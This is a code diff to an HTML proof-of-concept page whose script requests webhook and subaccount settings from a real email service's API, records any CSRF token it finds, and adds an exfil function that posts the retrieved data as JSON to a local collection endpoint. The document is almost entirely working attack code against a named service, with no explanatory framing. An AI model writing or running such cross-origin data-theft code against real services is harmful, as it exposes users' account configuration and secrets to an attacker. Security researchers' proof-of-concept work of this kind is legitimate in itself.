@@ -16,7 +16,8 @@
 <pre id="log">Running...</pre>
 
 <script>
-const T = 'https://app-us.smtp2go.com';
+const T      = 'https://app-us.smtp2go.com';
+const EXFIL  = 'http://localhost:8080/exfil';
 let csrf = null;
 
 function log(msg, cls) {
@@ -25,6 +26,14 @@ function log(msg, cls) {
   if (cls) span.className = cls;
   span.textContent = msg + '\n';
   el.appendChild(span);
+}
+
+function exfil(label, data) {
+  fetch(EXFIL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ label, data, ts: new Date().toISOString() })
+  }).catch(() => {});
 }
 
 async function get(url, opts) {
@@ -52,6 +61,7 @@ async function run() {
     if (csrf) log(`CSRF found: ${csrf}`, 'ok');
 
     log(body.slice(0, 3000), 'ok');
+    exfil('webhooks', parsed);
   } catch(e) { log('FAILED: ' + e.message, 'err'); return; }
 
   // [2] Subaccounts — no CSRF, account metadata + plan info
@@ -59,6 +69,7 @@ async function run() {
   try {
     const { body } = await get('/api/settings/subaccounts/');
     log(body.slice(0, 3000), 'ok');
+    try { exfil('subaccounts', JSON.parse(body)); } catch { exfil('subaccounts', body); }
   } catch(e) { log('FAILED: ' + e.message, 'err'); }
 
   log('\nDone.', 'ok');
